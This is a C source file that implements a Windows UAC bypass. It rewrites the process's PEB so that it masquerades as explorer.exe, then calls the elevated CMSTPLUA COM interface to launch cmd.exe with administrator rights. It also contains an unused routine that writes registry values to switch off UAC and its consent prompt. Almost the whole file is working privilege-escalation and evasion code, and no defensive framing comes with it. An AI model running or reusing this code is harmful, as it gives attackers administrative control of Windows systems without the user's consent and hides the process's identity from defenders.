#include <stdio.h>

/**
 * Standard Library.
 *
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

 /**
  * Data type limits.
  *
  * The macros defined in this header, limits the values of various variable types like char, int and long.
  * https://www.tutorialspoint.com/c_standard_library/limits_h.htm
  */
#include <limits.h>

  /**
   * Strings.
   *
   * Defines one variable type, one macro, and various functions for manipulating arrays of characters.
   * https://www.tutorialspoint.com/c_standard_library/string_h.htm
   */
#include <string.h>

   /**
    * Integers.
    *
    * Defines macros that specify limits of integer types corresponding to types defined in other standard headers.
    * https://pubs.opengroup.org/onlinepubs/009696899/basedefs/stdint.h.html
    */
#include <stdint.h>

    /**
     * Booleans.
     *
     * Defines boolean types.
     * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
     */
#include <stdbool.h>

     /**
      * Windows API.
      *
      * Contains declarations for all of the functions, macro's & data types in the Windows API.
      * https://docs.microsoft.com/en-us/previous-versions//aa383749(v=vs.85)?redirectedfrom=MSDN
      */
#include <windows.h>

      /**
       * Process Threads API
       *
       * API set defining threading functions, helpers, etc.
       * https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/
       */
#include <processthreadsapi.h>

       /**
        * User Environment
        *
        * Header file for user environment API. User Profiles, environment variables, and Group Policy.
        * https://learn.microsoft.com/en-us/windows/win32/api/userenv/
        */
#include <userenv.h>

        /**
         * Remote Desktop Services
         *
         * Windows Terminal Server public APIs.
         * https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/
         */
#include <wtsapi32.h>

         /**
          * Tool Help Library
          *
          * WIN32 tool help functions, types, and definitions.
          * https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/
          */
#include <tlhelp32.h>

          /**
           * Windows User
           *
           * USER procedure declarations, constant definitions and macros
           * https://learn.microsoft.com/en-us/windows/win32/api/winuser/
           */
#include <winuser.h>

           /**
            * Internal NT API's and data structures.
            *
            * Helper library that contains NT API's and data structures for system services, security and identity.
            * https://docs.microsoft.com/en-us/windows/win32/api/winternl/
            */
#include <winternl.h>

            /**
             * Windows Update Agent API
             *
             * https://docs.microsoft.com/en-us/windows/win32/api/wuapi/
             */
#define COBJMACROS
#include <wuapi.h>

             /**
             * Load custom header files.
             */

             /**
             * Dynamically include Windows libraries
             */
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")

bool previewPrivilege()
{
    HANDLE CurrentProcess; // eax
    bool v2; //s [esp+6h] [ebp-12h]
    HANDLE TokenHandle; // [esp+8h] [ebp-10h] BYREF
    DWORD ReturnLength; // [esp+Ch] [ebp-Ch] BYREF
    int TokenInformation; // [esp+10h] [ebp-8h] BYREF

    v2 = 0;
    TokenHandle = 0;
    CurrentProcess = GetCurrentProcess();
    if (OpenProcessToken(CurrentProcess, 8u, &TokenHandle))
    {
        TokenInformation = 0;
        ReturnLength = 4;
        if (GetTokenInformation(TokenHandle, TokenElevation, &TokenInformation, 4u, &ReturnLength))
            v2 = TokenInformation != 0;
    }
    if (TokenHandle)
        CloseHandle(TokenHandle);
    return v2;
}
typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
        HRESULT(STDMETHODCALLTYPE* QueryInterface) (__RPC__in ICMLuaUtil* This, __RPC__in REFIID riid, _COM_Outptr_  void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef) (__RPC__in ICMLuaUtil* This);
    ULONG(STDMETHODCALLTYPE* Release) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method1) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method2) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method3) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method4) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method5) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method6) (__RPC__in ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* ShellExec) (__RPC__in ICMLuaUtil* This, _In_ LPCTSTR lpFile, _In_opt_ LPCTSTR lpParameters, _In_opt_ LPCTSTR lpDirectory, _In_ ULONG fMask, _In_ ULONG nShow);
    END_INTERFACE
} *PICMLuaUtilVtbl;

interface ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};

void escalatePrivlege() {
    ICMLuaUtil* ppv = NULL;
    IID iid;
    BIND_OPTS3 pBindOptions;
    HRESULT res = E_FAIL;

    do {
        res = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
        if (res != S_OK) {
            break;
        }
        memset(&iid, 0, sizeof(iid));
        if (IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &iid) != S_OK) {
            break;
        }
        memset(&pBindOptions, 0, sizeof(pBindOptions));
        pBindOptions.cbStruct = sizeof(pBindOptions);
        pBindOptions.dwClassContext = CLSCTX_LOCAL_SERVER;

        ppv = 0;
        res = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", (BIND_OPTS*)&pBindOptions, &iid, (void**)&ppv);
        if (res != S_OK) {
            printf("\t- Could not perform CoGetObject:");
            CoUninitialize();
            break;
        }
        if (ppv) {
            /*
            wchar_t* wFile = calloc(strlen(filePath) + 1, sizeof(wchar_t));
            mbstowcs(wFile, filePath, strlen(filePath));
            printf("end file % ls", filePath);
            */

            res = ppv->lpVtbl->ShellExec(ppv, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SEE_MASK_DEFAULT, SW_SHOW);

            if (res != S_OK) {
                printf("\t- Could not perform ShellExec.");
                CoUninitialize();
                break;
            }
            CoUninitialize();
        }
        CoUninitialize();
    } while (false);

    if (ppv != NULL) {
        ppv->lpVtbl->Release(ppv);
    }
}

void DisplayErrorMessage(DWORD errorCode) {
    LPVOID errorMsg;
    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL,
        errorCode,
        0,
        (LPWSTR)&errorMsg,
        0,
        NULL
    );

    if (errorMsg != NULL) {
        printf(L"Error: %s\n", errorMsg);
        LocalFree(errorMsg);
    }
    else {
        printf(L"Error code: %d\n", errorCode);
    }
}


bool enableLUA() {

    HKEY phkResult; // [esp+4h] [ebp-10h] BYREF

    DWORD dwValue = 0;
    BYTE v2[4];
    LONG result = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        NULL,
        0,
        KEY_WRITE,
        &phkResult);
    if (result == ERROR_SUCCESS)
    {
        result = RegSetValueExW(phkResult, L"EnableLUA", 0, REG_DWORD,
            (const BYTE*)&dwValue,
            sizeof(DWORD));
        DisplayErrorMessage(result);
        RegCloseKey(phkResult);
        if (result == ERROR_SUCCESS)
        {
            printf("Regsitry key updated");
            return true;
        }
        else {
            *(DWORD*)v2 = 0;
            result = RegSetValueExW(phkResult, L"ConsentPromptBehaviorAdmin", 0, 4u, v2, 4u);
            RegCloseKey(phkResult);
            if (result == ERROR_SUCCESS) {
                printf("ConsentPromptBehaviorAdmin value updated");
                return true;
            }
            else {
                printf("Fail to bypass UAC");
                DisplayErrorMessage(result);
                return false;
            }
        }
    }



    return false;
}

/*
char* getFilePath() {
    WCHAR filePath[MAX_PATH];
    LPCSTR file;
    // Get the file path of the current process
    DWORD result = GetModuleFileNameW(NULL, filePath, MAX_PATH);

    if (result != 0) {
        char* ansiBuffer = (char*)malloc(MAX_PATH);
        if (ansiBuffer != NULL) {
            WideCharToMultiByte(CP_ACP, 0, filePath, -1, ansiBuffer, MAX_PATH, NULL, NULL);

            // Use ansiBuffer as LPCSTR
            return ansiBuffer;
        }
    }
    else {
        DWORD error = GetLastError();
        printf("GetModuleFileName failed with error code: %d\n", error);
    }
    return filePath;
}
*/

/**
 * Get current Process Environment Block.
 *
 * @return PEB* The current PEB.
 */
void* NtGetPeb() {
#ifdef _M_X64
    return (void*)__readgsqword(0x60);
#elif _M_IX86
    return (void*)__readfsdword(0x30);
#else
#error "This architecture is currently unsupported"
#endif
}


/**
 * Masquerade the current PEB to look like 'explorer.exe'.
 *
 * @return int Zero if succesfully executed, any other integer otherwise.
 */
int masqueradePEB() {
    printf("\t- Defining local structs.");

    /**
     * Define local PEB LDR DATA
     */
    typedef struct _PEB_LDR_DATA {
        ULONG Length;
        BOOLEAN Initialized;
        HANDLE SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
        PVOID EntryInProgress;
        BOOLEAN ShutdownInProgress;
        HANDLE ShutdownThreadId;
    } PEB_LDR_DATA, * PPEB_LDR_DATA;


    /**
     * Define local RTL USER PROCESS PARAMETERS
     */
    typedef struct _RTL_USER_PROCESS_PARAMETERS {
        BYTE           Reserved1[16];
        PVOID          Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

    /**
     * Define partial local PEB
     */
    typedef struct _PEB {
        BOOLEAN InheritedAddressSpace;
        BOOLEAN ReadImageFileExecOptions;
        BOOLEAN BeingDebugged;
        union
        {
            BOOLEAN BitField;
            struct
            {
                BOOLEAN ImageUsesLargePages : 1;
                BOOLEAN IsProtectedProcess : 1;
                BOOLEAN IsLegacyProcess : 1;
                BOOLEAN IsImageDynamicallyRelocated : 1;
                BOOLEAN SkipPatchingUser32Forwarders : 1;
                BOOLEAN SpareBits : 3;
            };
        };
        HANDLE Mutant;

        PVOID ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
        PVOID SubSystemData;
        PVOID ProcessHeap;
        PRTL_CRITICAL_SECTION FastPebLock;
    } PEB, * PPEB;

    /**
     * Define local LDR DATA TABLE ENTRY
     */
    typedef struct _LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        union
        {
            LIST_ENTRY InInitializationOrderLinks;
            LIST_ENTRY InProgressLinks;
        };
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG Flags;
        WORD LoadCount;
        WORD TlsIndex;
        union
        {
            LIST_ENTRY HashLinks;
            struct
            {
                PVOID SectionPointer;
                ULONG CheckSum;
            };
        };
        union
        {
            ULONG TimeDateStamp;
            PVOID LoadedImports;
        };
    } LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

    typedef NTSTATUS(NTAPI* _RtlEnterCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
    typedef NTSTATUS(NTAPI* _RtlLeaveCriticalSection) (PRTL_CRITICAL_SECTION CriticalSection);
    typedef void (WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);

    _RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlEnterCriticalSection");
    if (RtlEnterCriticalSection == NULL) {
        printf("Could not find RtlEnterCriticalSection.");
        return 1;
    }

    _RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlLeaveCriticalSection");
    if (RtlLeaveCriticalSection == NULL) {
        printf("Could not find RtlLeaveCriticalSection.");
        return 1;
    }

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL) {
        printf("Could not find RtlInitUnicodeString.");
        return 1;
    }

    printf("\t- Getting 'explorer.exe' path.");
    WCHAR chExplorerPath[MAX_PATH];
    GetWindowsDirectoryW(chExplorerPath, MAX_PATH);
    wcscat_s(chExplorerPath, sizeof(chExplorerPath) / sizeof(wchar_t), L"\\explorer.exe");
    LPWSTR pwExplorerPath = (LPWSTR)malloc(MAX_PATH);
    wcscpy_s(pwExplorerPath, MAX_PATH, chExplorerPath);

    printf("\t- Getting current PEB.");
    PEB* peb = (PEB*)NtGetPeb();

    RtlEnterCriticalSection(peb->FastPebLock);

    printf("\t- Masquerading ImagePathName and CommandLine.");

    RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, chExplorerPath);
    RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, chExplorerPath);

    PLDR_DATA_TABLE_ENTRY pStartModuleInfo = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InLoadOrderModuleList.Flink;

    WCHAR wExeFileName[MAX_PATH];
    GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);

    do {
        if (_wcsicmp(wExeFileName, pNextModuleInfo->FullDllName.Buffer) == 0) {
            printf("\t- Masquerading FullDllName and BaseDllName.");
            RtlInitUnicodeString(&pNextModuleInfo->FullDllName, pwExplorerPath);
            RtlInitUnicodeString(&pNextModuleInfo->BaseDllName, pwExplorerPath);
            
            break;
        }

        pNextModuleInfo = (PLDR_DATA_TABLE_ENTRY)pNextModuleInfo->InLoadOrderLinks.Flink;
    } while (pNextModuleInfo != pStartModuleInfo);
    RtlLeaveCriticalSection(peb->FastPebLock);
    return 0;
}

int main() {
    bool res = previewPrivilege();
    if (res) {
        printf("Running in Administrator mode\n");
    }
    else {
        printf("Running in non-admin\n");
        // bool lua = enableLUA();
        int peb = masqueradePEB();
        if (peb == 0) {
            escalatePrivlege();
        }
        else {
            printf("peb cannot be modified");
        }

    }
    return 0;
}